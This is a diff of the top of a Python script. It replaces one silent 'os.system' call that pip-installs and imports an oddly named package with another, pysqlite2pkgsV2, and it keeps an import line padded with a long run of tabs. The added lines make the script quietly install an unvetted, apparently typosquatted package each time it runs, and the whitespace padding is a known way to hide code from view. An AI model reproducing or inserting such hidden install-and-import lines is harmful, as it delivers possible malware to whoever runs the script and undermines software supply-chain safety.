@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlitedbextV1")
-import pysqlitedbextV1
+os.system("pip install pysqlite2pkgsV2")
+import pysqlite2pkgsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
